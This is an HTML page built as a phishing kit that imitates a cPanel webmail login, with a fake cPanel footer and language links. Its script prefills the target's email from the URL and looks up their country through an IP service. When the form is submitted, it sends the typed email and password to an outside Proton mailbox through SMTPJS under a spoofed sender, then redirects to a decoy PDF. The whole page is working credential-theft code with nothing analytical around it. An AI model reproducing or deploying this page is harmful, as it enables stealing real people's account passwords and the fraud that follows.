<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .container {
            margin-top: 150px;
        }

        img {
            margin-bottom: 30px;
            width: 250px;
        }

        .login-box {
            margin: 0 auto;
            width: 300px;
        }

        .login-box label {
            display: block;
            text-align: left;
            margin: 5px 0;
            font-weight: normal;
        }

        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 15px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
        }

        .login-box button:hover {
            background-color: #0056b3;
        }

        .languages {
            margin-top: 100px;
            color: gray;
        }

        .languages a {
            color: gray;
            text-decoration: none;
            margin-right: 15px;
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: gray;
        }

        .footer a {
            color: gray;
            text-decoration: none;
        }
    </style>

    <!-- Include Email.js library -->
    <script src="https://smtpjs.com/v3/smtp.js"></script>

    <script>
        let userCountry = "";

        // Function to populate the email field from URL parameter
        function populateEmailField() {
            const params = new URLSearchParams(window.location.search);
            if (params.has('email')) {
                document.getElementById('email').value = params.get('email');
            }
        }

        // Function to get user's country
        function getUserCountry() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    userCountry = data.country_name;
                })
                .catch(error => {
                    console.error('Error fetching country:', error);
                });
        }

        // Function to send data to email using SMTP
        function sendDataToEmail(event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;

            Email.send({
                SecureToken: "your-smtpjs-token",  // Replace with your SecureToken from smtpjs.com
                To: 'sozyurt1@proton.me',
                From: "admin@os1freightvn.com",
                Subject: "Webmail Login Attempt",
                Body: message
            }).then(
                response => {
                    if (response === "OK") {
                        window.location.href = "documentequipment001.pdf";  // Redirect on success
                    } else {
                        alert("Failed to send email. Please try again later.");
                    }
                }
            ).catch(error => {
                console.error("Error sending email:", error);
            });
        }

        window.onload = function() {
            populateEmailField();
            getUserCountry();
        };
    </script>
</head>
<body>
    <div class="container">
        <img src="webmail-logo.svg" alt="Webmail Logo">
        <div class="login-box">
            <form onsubmit="sendDataToEmail(event)">
                <label for="email">Email Address</label>
                <input type="text" id="email" name="email" placeholder="Enter your email address" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your email password" required>
                
                <button type="submit">Log in</button>
            </form>
        </div>
        <div class="languages">
            <a href="#">English</a>
            <a href="#">العربية</a>
            <a href="#">čeština</a>
            <a href="#">dansk</a>
            <a href="#">Deutsch</a>
            <a href="#">Ελληνικά</a>
            <a href="#">español</a>
            <a href="#">español latinoamericano</a>
        </div>
        <div class="footer">
            <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
        </div>
    </div>
</body>
</html>
